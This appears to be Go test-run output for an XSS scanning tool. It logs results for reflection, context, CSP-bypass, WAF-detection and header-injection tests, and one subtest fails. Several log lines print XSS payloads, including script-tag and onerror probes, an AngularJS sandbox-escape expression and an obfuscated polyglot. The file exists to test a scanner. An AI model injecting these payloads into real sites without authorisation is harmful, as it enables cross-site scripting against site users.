=== RUN   TestBlindXSS
--- PASS: TestBlindXSS (0.61s)
=== RUN   TestBlindXSSHeader
--- PASS: TestBlindXSSHeader (0.50s)
=== RUN   TestPolyglotSuggestion
--- PASS: TestPolyglotSuggestion (0.00s)
=== RUN   TestPolyglotContexts
=== RUN   TestPolyglotContexts/Attribute_Context
=== RUN   TestPolyglotContexts/JavaScript_Context
--- PASS: TestPolyglotContexts (0.00s)
    --- PASS: TestPolyglotContexts/Attribute_Context (0.00s)
    --- PASS: TestPolyglotContexts/JavaScript_Context (0.00s)
=== RUN   TestBlindXSSPOSTBody
--- PASS: TestBlindXSSPOSTBody (0.51s)
=== RUN   TestAngularJSDetection
=== RUN   TestAngularJSDetection/Angular_template_with_ng-app
=== RUN   TestAngularJSDetection/Angular_ng-bind_attribute
=== RUN   TestAngularJSDetection/Non-Angular_HTML
=== RUN   TestAngularJSDetection/Angular_with_data-ng-app
--- PASS: TestAngularJSDetection (0.00s)
    --- PASS: TestAngularJSDetection/Angular_template_with_ng-app (0.00s)
    --- PASS: TestAngularJSDetection/Angular_ng-bind_attribute (0.00s)
    --- PASS: TestAngularJSDetection/Non-Angular_HTML (0.00s)
    --- PASS: TestAngularJSDetection/Angular_with_data-ng-app (0.00s)
=== RUN   TestAngularJSPayloads
=== RUN   TestAngularJSPayloads/Constructor_escape_with_parens_and_dot
    angular_test.go:93: Payload: {{$on.constructor('alert(1)')()}}
=== RUN   TestAngularJSPayloads/Array_escape_with_brackets
    angular_test.go:93: Payload: {{$on.constructor('alert(1)')()}}
=== RUN   TestAngularJSPayloads/Simple_expression_fallback
    angular_test.go:93: Payload: {{alert(1)}}
--- PASS: TestAngularJSPayloads (0.00s)
    --- PASS: TestAngularJSPayloads/Constructor_escape_with_parens_and_dot (0.00s)
    --- PASS: TestAngularJSPayloads/Array_escape_with_brackets (0.00s)
    --- PASS: TestAngularJSPayloads/Simple_expression_fallback (0.00s)
=== RUN   TestContextDetection_HTML
    context_test.go:42: Context: html, Exploitable: true, Payload: <script>alert(1)</script>
--- PASS: TestContextDetection_HTML (0.00s)
=== RUN   TestContextDetection_JavaScript
    context_test.go:76: Context: javascript_double_quote, Payload: </script><img src=x onerror=alert(1)>
--- PASS: TestContextDetection_JavaScript (0.00s)
=== RUN   TestContextDetection_Attribute
    context_test.go:105: Context: attribute, Payload: "><script>alert(1)</script>
--- PASS: TestContextDetection_Attribute (0.00s)
=== RUN   TestContextDetection_Comment
    context_test.go:139: Context: comment, Exploitable: false
--- PASS: TestContextDetection_Comment (0.00s)
=== RUN   TestSecurityHeaders_CSP
    context_test.go:179: CSP: default-src 'self', Exploitable: false
--- PASS: TestSecurityHeaders_CSP (0.00s)
=== RUN   TestExploitability_WithRequiredChars
    context_test.go:220: Unfiltered chars: [" ' < > $ | ( ) ` : ; { } & # = /   	 % \ . [ ] + - *], Exploitable: true
--- PASS: TestExploitability_WithRequiredChars (0.00s)
=== RUN   TestPayloadSuggestions
=== RUN   TestPayloadSuggestions/HTML_with_angle_brackets
    context_test.go:279: Context: html, Payload: <script>alert(1)</script>
=== RUN   TestPayloadSuggestions/JavaScript_with_quotes
    context_test.go:279: Context: javascript_double_quote, Payload: </script><img src=x onerror=alert(1)>
=== RUN   TestPayloadSuggestions/Attribute_with_quotes
    context_test.go:279: Context: attribute, Payload: "><script>alert(1)</script>
--- PASS: TestPayloadSuggestions (0.00s)
    --- PASS: TestPayloadSuggestions/HTML_with_angle_brackets (0.00s)
    --- PASS: TestPayloadSuggestions/JavaScript_with_quotes (0.00s)
    --- PASS: TestPayloadSuggestions/Attribute_with_quotes (0.00s)
=== RUN   TestCSPBypass_UnsafeInline
--- PASS: TestCSPBypass_UnsafeInline (0.00s)
=== RUN   TestCSPBypass_UnsafeEval
--- PASS: TestCSPBypass_UnsafeEval (0.00s)
=== RUN   TestCSPBypass_Wildcard
--- PASS: TestCSPBypass_Wildcard (0.00s)
=== RUN   TestCSPBypass_JSONP
--- PASS: TestCSPBypass_JSONP (0.00s)
=== RUN   TestCSPBypass_CDN
--- PASS: TestCSPBypass_CDN (0.00s)
=== RUN   TestCSPBypass_DataURI
--- PASS: TestCSPBypass_DataURI (0.00s)
=== RUN   TestCSPBypass_MissingBaseURI
--- PASS: TestCSPBypass_MissingBaseURI (0.00s)
=== RUN   TestCSPBypass_Strict
--- PASS: TestCSPBypass_Strict (0.00s)
=== RUN   TestHTMLEncodingFalsePositive
    detection_test.go:40: Scanner reported 1 results (expected for screening tool)
--- PASS: TestHTMLEncodingFalsePositive (0.00s)
=== RUN   TestMultipleReflections
    detection_test.go:74: Found 1 reflected parameters
    detection_test.go:77: Parameter q has unfiltered chars: [" ' < > $ | ( ) ` : ; { } & # = /   	 % \ . [ ] + - *]
--- PASS: TestMultipleReflections (0.00s)
=== RUN   TestXSSWithoutQuotes
    detection_test.go:113: Successfully detected '=' character needed for XSS without quotes
    detection_test.go:113: Successfully detected ' ' character needed for XSS without quotes
--- PASS: TestXSSWithoutQuotes (0.00s)
=== RUN   TestLargeReflection
    detection_test.go:150: Successfully detected reflection in large content
--- PASS: TestLargeReflection (0.00s)
=== RUN   TestUniqueBaselineProbe
    detection_test.go:178: Successfully detected reflection using unique baseline probe
--- PASS: TestUniqueBaselineProbe (0.00s)
=== RUN   TestRawPayloadMode
    detection_test.go:202: Raw payload mode test completed, results: 0
--- PASS: TestRawPayloadMode (0.00s)
=== RUN   TestProxySupport
--- PASS: TestProxySupport (0.00s)
=== RUN   TestCustomHeaders
--- PASS: TestCustomHeaders (0.00s)
=== RUN   TestGranularJSContext
=== RUN   TestGranularJSContext/JS_Single_Quote
=== RUN   TestGranularJSContext/JS_Double_Quote
    js_context_test.go:60: GetSuggestedPayload() = ";alert(1);", want ";alert(1);
=== RUN   TestGranularJSContext/JS_Raw
=== RUN   TestGranularJSContext/JS_Raw_No_Semicolon
--- FAIL: TestGranularJSContext (0.00s)
    --- PASS: TestGranularJSContext/JS_Single_Quote (0.00s)
    --- FAIL: TestGranularJSContext/JS_Double_Quote (0.00s)
    --- PASS: TestGranularJSContext/JS_Raw (0.00s)
    --- PASS: TestGranularJSContext/JS_Raw_No_Semicolon (0.00s)
=== RUN   TestTagNameContext
--- PASS: TestTagNameContext (0.00s)
=== RUN   TestRCDATAContextTitle
--- PASS: TestRCDATAContextTitle (0.00s)
=== RUN   TestRCDATAContextTextarea
--- PASS: TestRCDATAContextTextarea (0.00s)
=== RUN   TestMissingContexts
=== RUN   TestMissingContexts/Meta_Refresh
=== RUN   TestMissingContexts/Data_URI
=== RUN   TestMissingContexts/SVG
--- PASS: TestMissingContexts (0.00s)
    --- PASS: TestMissingContexts/Meta_Refresh (0.00s)
    --- PASS: TestMissingContexts/Data_URI (0.00s)
    --- PASS: TestMissingContexts/SVG (0.00s)
=== RUN   TestMXSSDetection
--- PASS: TestMXSSDetection (0.00s)
=== RUN   TestDanglingMarkupPayload
--- PASS: TestDanglingMarkupPayload (0.00s)
=== RUN   TestContextDetection_TemplateLiteral
--- PASS: TestContextDetection_TemplateLiteral (0.00s)
=== RUN   TestContextDetection_SVG
    new_contexts_test.go:74: SVG Context detected, Payload: jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
--- PASS: TestContextDetection_SVG (0.00s)
=== RUN   TestContextDetection_MetaRefresh
--- PASS: TestContextDetection_MetaRefresh (0.00s)
=== RUN   TestContextDetection_DataURI
--- PASS: TestContextDetection_DataURI (0.00s)
=== RUN   TestPOSTFormScan
    post_header_test.go:57: Found vulnerable param: email (context: html, exploitable: true)
    post_header_test.go:57: Found vulnerable param: name (context: html, exploitable: true)
--- PASS: TestPOSTFormScan (0.00s)
=== RUN   TestPOSTJSONScan
    post_header_test.go:95: Found 2 vulnerable parameters in JSON POST
--- PASS: TestPOSTJSONScan (0.00s)
=== RUN   TestPUTScan
    post_header_test.go:137: Found vulnerable param in PUT: title
--- PASS: TestPUTScan (0.00s)
=== RUN   TestHeaderInjectionScan
    post_header_test.go:182: Found vulnerable header: User-Agent (context: html, exploitable: true)
    post_header_test.go:182: Found vulnerable header: Referer (context: html, exploitable: true)
    post_header_test.go:182: Found vulnerable header: X-Forwarded-For (context: html, exploitable: true)
--- PASS: TestHeaderInjectionScan (0.00s)
=== RUN   TestMixedScan
    post_header_test.go:225: Mixed scan found 1 GET params and 1 headers
--- PASS: TestMixedScan (0.00s)
=== RUN   TestWAFDetection
=== RUN   TestWAFDetection/Cloudflare_via_Server_header
=== RUN   TestWAFDetection/Cloudflare_via_CF-Ray
=== RUN   TestWAFDetection/AWS_WAF
=== RUN   TestWAFDetection/Akamai
=== RUN   TestWAFDetection/Imperva
=== RUN   TestWAFDetection/ModSecurity
=== RUN   TestWAFDetection/F5_BIG-IP
=== RUN   TestWAFDetection/Sucuri
=== RUN   TestWAFDetection/Barracuda
=== RUN   TestWAFDetection/No_WAF_detected
--- PASS: TestWAFDetection (0.00s)
    --- PASS: TestWAFDetection/Cloudflare_via_Server_header (0.00s)
    --- PASS: TestWAFDetection/Cloudflare_via_CF-Ray (0.00s)
    --- PASS: TestWAFDetection/AWS_WAF (0.00s)
    --- PASS: TestWAFDetection/Akamai (0.00s)
    --- PASS: TestWAFDetection/Imperva (0.00s)
    --- PASS: TestWAFDetection/ModSecurity (0.00s)
    --- PASS: TestWAFDetection/F5_BIG-IP (0.00s)
    --- PASS: TestWAFDetection/Sucuri (0.00s)
    --- PASS: TestWAFDetection/Barracuda (0.00s)
    --- PASS: TestWAFDetection/No_WAF_detected (0.00s)
FAIL
FAIL	github.com/lcalzada-xor/xxss/v2/tests	1.661s
FAIL
